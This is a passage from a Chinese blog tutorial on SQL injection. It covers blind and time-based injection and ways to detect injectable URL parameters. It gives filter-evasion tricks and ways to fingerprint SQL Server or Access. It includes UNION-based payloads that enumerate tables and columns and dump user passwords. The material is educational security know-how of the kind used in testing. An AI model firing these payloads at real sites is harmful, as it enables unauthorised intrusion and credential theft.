href=#强制产生通用错误>#</a></h3><p>应用中经常使用通用错误页面来替换数据库错误，即使出现通用错误页面，也可以推断<code>SQL注入</code>是否可行。若应用只在提交单引号或其中一个变量时才产生通用错误页面，那么很可能存在<code>SQL盲注</code>。提交单引号是最常见的错误源受损的<code>SQL查询</code>。</p><h3 id=注入带副作用的查询>注入带副作用的查询<a hidden class=anchor aria-hidden=true href=#注入带副作用的查询>#</a></h3><p>最常用的是时序攻击来确认攻击者的<code>SQL</code>是否已执行，有时也可利用攻击者能够观察到的输出进行判断。</p><h3 id=拆分与平衡>拆分与平衡<a hidden class=anchor aria-hidden=true href=#拆分与平衡>#</a></h3><p>分解合法输入的操作称为拆分，平衡保证最终查询中不包含不平衡的结尾单引号。</p><p>基本思想:收集合法的请求参数，之后使用<code>SQL</code>关键字对他们进行修改以保证与原数据不同，担当数据库解析他们时，二者的功能等价。</p><h3 id=基于时间的盲注>基于时间的盲注<a hidden class=anchor aria-hidden=true href=#基于时间的盲注>#</a></h3><p>所有相应都包含一种属性:发出请求到响应到达这段时间的差异。当某一状态为真时，能够让响应暂停几秒，为假时，能够不出现暂停。</p><h3 id=基于响应的盲注>基于响应的盲注<a hidden class=anchor aria-hidden=true href=#基于响应的盲注>#</a></h3><p>通过仔细检查响应中的数据来推断状态，推断状态时，借助响应中包含的文本或在检查特定值时强制产生的错误，产生的错误类型是运行时错误而非查询编译错误。</p><h2 id=常用步骤>常用步骤<a hidden class=anchor aria-hidden=true href=#常用步骤>#</a></h2><h3 id=一发现sql注入位置>（一）发现SQL注入位置<a hidden class=anchor aria-hidden=true href=#一发现sql注入位置>#</a></h3><h4 id=1整型参数判断>1.整型参数判断<a hidden class=anchor aria-hidden=true href=#1整型参数判断>#</a></h4><p><code>HTTP://xxx.xxx.xxx/xxx.asp?p=xx'</code>，此时<code>xxx.asp</code>中<code>SQL</code>语句变成了<code>select * from 表名 where 字段=xx' </code>，<code>xx.asp</code>运行异常。</p><p><code>HTTP://xxx.xxx.xxx/xxx.asp?p=xx and 1=1</code>，<code>xxx.asp</code>运行正常，且与<code>HTTP://xxx.xxx.xxx/xxx.asp?p=xx</code>运行结果相同。</p><p><code>HTTP://xxx.xxx.xxx/xxx.asp?p=xx and 1=2</code>，<code>xxx.asp</code>运行异常。</p><h4 id=2字符型参数判断>2.字符型参数判断<a hidden class=anchor aria-hidden=true href=#2字符型参数判断>#</a></h4><p><code>HTTP://xxx.xxx.xxx/xxx.asp?p=xx'</code>，此时<code>xxx.asp</code>中的<code>SQL语句</code>变成了<code>select * from 表名 where 字段=xx'</code>，<code>xxx.asp</code>运行异常。</p><p><code>HTTP://xxx.xxx.xxx/xxx.asp?p=xx&nm...39;1'='1'</code>，<code>xxx.asp</code>运行正常，且与<code>HTTP://xxx.xxx.xxx/xxx.asp?p=xx</code>运行结果相同。</p><p><code>HTTP://xxx.xxx.xxx/xxx.asp?p=xx&nb...39;1'='2'</code>，<code>xxx.asp</code>运行异常。</p><p>若这三步全满足，则<code>xxx.asp</code>一定存在<code>SQL注入</code>漏洞。</p><h4 id=特殊类型参数判断>特殊类型参数判断<a hidden class=anchor aria-hidden=true href=#特殊类型参数判断>#</a></h4><p>对于字符过滤等情况，可以尝试以下方法。</p><p>大小写混合:<code>VBS</code>不区分大小写，程序员在设计时往往忽略大小写混合情况，可以尝试使用<code>SelecT</code>代替<code>select</code>。</p><p><code>UNICODE</code>:<code>UNICODE</code>字符集实现国际化，<code>+=%2B</code>，<code>space=%20</code>。</p><p><code>ASCII</code>:<code>U=chr(85)</code>，<code>a=chr(97)</code>。</p><h3 id=二判断后台数据库类型>（二）判断后台数据库类型<a hidden class=anchor aria-hidden=true href=#二判断后台数据库类型>#</a></h3><h4 id=查询数据库名称>查询数据库名称<a hidden class=anchor aria-hidden=true href=#查询数据库名称>#</a></h4><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-mysql data-lang=mysql><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39; union select 1,database();
</span></code></pre></div><h4 id=查询数据库表名>查询数据库表名<a hidden class=anchor aria-hidden=true href=#查询数据库表名>#</a></h4><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-mysql data-lang=mysql><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database();
</span></code></pre></div><h4 id=获取字段名>获取字段名<a hidden class=anchor aria-hidden=true href=#获取字段名>#</a></h4><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-mysql data-lang=mysql><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39; union select 1,group_concat(columns_name) from information_schema.columns where table_name=&#39;</span>tablename<span style=color:#e6db74>&#39;;
</span></code></pre></div><h4 id=获取数据库详细内容>获取数据库详细内容<a hidden class=anchor aria-hidden=true href=#获取数据库详细内容>#</a></h4><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-mysql data-lang=mysql><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users;
</span></code></pre></div><h3 id=三判断数据库>（三）判断数据库<a hidden class=anchor aria-hidden=true href=#三判断数据库>#</a></h3><h4 id=sql-server>SQL Server<a hidden class=anchor aria-hidden=true href=#sql-server>#</a></h4><p><code>SQL Server</code>有<code>user</code>，<code>db_name()</code>等系统变量，利用这些系统值不仅可以判断<code>SQL Server</code>，还能得到其他信息。</p><p><code>SQL Server系统表</code>为<code>sysobjects</code>，在<code>Web</code>环境下有访问权限。</p><p><code>HTTP://xxx.xxx.xxx/xxx.asp?p=xx and user>0</code>，可以判断是否为<code>SQL Server</code>，还能得到当前连接到数据库的用户名。</p><p><code>HTTP://xxx.xxx.xxx/xxx.asp?p=xx&n...db_name()>0</code>，可以判断是否为<code>SQL Server</code>，还能得到当前正在使用的数据库名。</p><h4 id=access>Access<a hidden class=anchor aria-hidden=true href=#access>#</a></h4><p><code>Access系统表</code>为<code>msysobjects</code>，且在<code>Web</code>环境下没有访问权限。</p><p><code>HTTP://xxx.xxx.xxx/xxx.asp?p=xx and (select count(*) from sysobjects)>0</code></p><p><code>HTTP://xxx.xxx.xxx/xxx.asp?p=xx and (select count(*) from msysobjects)>0</code></p><p>若数据库为<code>SQL Server</code>，则第一条语句<code>xxx.asp</code>运行正常，第二条语句异常；若数据库为<code>Access</code>，两条语句均异常。</p><h4 id=mssql>MSSQL<a hidden class=anchor aria-hidden=true href=#mssql>#</a></h4><p><code>sysdatabase</code>:系统表，每个数据库在表中占一行，该表只存储在<code>master</code>数据库中，保存了所有库名、<code>库ID</code>及一些相关信息。</p><p><code>sysobjects</code>:存放数据库内创建的所有对象，如约束、默认值、日志、规则、存储过程等，每个对象在表中占一行。</p><p><code>syscolumns</code>:每个表和视图中的每列在表中占一行，存储过程中的每个参数在表中也占一行，该表位于每个数据库中。主要字段:<code>name</code>(字段名称)，<code>id</code>(表ID号)，<code>colid</code>(字段ID号)，<code>id</code>是<code>sysobjects</code>得到的<code>表ID</code>号。</p><h3 id=四确定xp_cmdshell可执行情况>（四）确定XP_CMDSHELL可执行情况<a hidden class=anchor aria-hidden=true href=#四确定xp_cmdshell可执行情况>#</a></h3><blockquote><p>本文链接:<a href=https://oopsdc.tk/post/sql%E6%B3%A8%E5%85%A5/>SQL注入 | Atmet (oopsdc.tk)</a></p><p>文章许可:本文采用<a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh>CC BY-NC-SA 4.0</a>许可协议，转载请注明出处。</p></blockquote></div><footer class=post-footer><ul class=post-tags><li><a href=https://oopsdc.tk/tags/daily/>Daily</a></li></ul><nav class=paginav><a class=prev href=https://oopsdc.tk/post/gtk+/><span class=title>« Prev Page</span><br><span>GTK+</span></a>
<a class=next href=https://oopsdc.tk/post/my-1st-post/><span class=title>Next Page »</span><br><span>My 1st post</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2021 <a href=https://oopsdc.tk/>Atmet</a></span>
<span>&#183;</span>
<span>Powered by <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span>
<span>&#183;</span>
<span>Theme <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script defer src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script><script>window.onload=function(){localStorage.getItem("menu-scroll-position")&&(document.getElementById('menu').scrollLeft=localStorage.getItem("menu-scroll-position"))};function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById('menu').scrollLeft)}document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script></body></html>